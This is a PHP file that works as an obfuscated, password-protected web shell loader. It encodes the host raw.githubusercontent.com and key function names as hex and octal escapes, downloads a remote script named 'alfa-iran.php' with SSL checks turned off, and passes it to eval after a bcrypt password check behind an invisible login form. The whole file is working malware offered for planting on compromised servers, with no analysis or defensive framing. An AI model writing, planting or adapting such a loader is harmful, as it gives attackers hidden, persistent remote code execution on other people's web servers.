<?php
session_start();
$protocol = "https";
$domain = "\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d";
$file_path = "/1mgR00T/simpan/refs/heads/main/alfa-iran.php";
$url = $protocol . "://" . $domain . $file_path;

function fetch_content($url, $method) {
    $fpn = "\146" . "\x6f" . "\160" . "\145" . "\x6e";
	$strim = "\163" . "\x74" . "\x72" . "\145" . "\x61" . "\x6d" . "\x5f" . "\x67" . "\x65" . "\164" . "\137" . "\x63" . "\x6f" . "\156" . "\x74" . "\x65" . "\156" . "\x74" . "\x73";
	$fgt = "\146" . "\151" . "\x6c" . "\x65" . "\x5f" . "\147" . "\145" . "\x74" . "\137" . "\x63" . "\157" . "\x6e" . "\x74" . "\x65" . "\156" . "\164" . "\163";
	$cexec = "\143" . "\165" . "\162" . "\154" . "\137" . "\x65" . "\x78" . "\145" . "\x63";

    switch ($method) {
        case 'fe_gt_onten':
            if (ini_get('allow_url_fopen')) {
                return $fgt($url);
            }
            break;
        case 'cl':
            if (function_exists('curl_version')) {
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $response = $cexec($ch);
                curl_close($ch);
                return $response;
            }
            break;
        case 'strm':
            if ($stream = $fpn($url, 'r')) {
                $content = $strim($stream);
                fclose($stream);
                return $content;
            }
            break;
        default:
            return false;
    }
    return false;
}

$methods = ['fe_gt_onten', 'cl', 'strm'];
$content = false;

foreach ($methods as $method) {
    $content = fetch_content($url, $method);
    if ($content !== false) {
        break;
    }
}
function is_logged_in(): bool {
    return isset($_SESSION['auth']) && $_SESSION['auth'] === true;
}

if (isset($_POST['password'])) {
    $entered_password = $_POST['password'];
    $hashed_password = '$2a$12$w1bti0.Wn5hvrzOwj2/o5eVsSaDmr0o1JcyXhBSYe9Esf5qxV57Z.';

    if (password_verify($entered_password, $hashed_password)) {
        $_SESSION['auth'] = true;
    } else {
        echo "Wrong Input";
    }
}   
if (is_logged_in() && $content !== false) {
    eval("?>" . $content);
}	  else {
    ?>
    <?php
    echo "<form method='post' style='height:100%;margin:0;display:flex;justify-content:center;align-items:center'><input style='margin:0;background-color:#ffffff00;border:1px solid #ffffff00;' type='password' name='password'></form></body></html>";
}
?>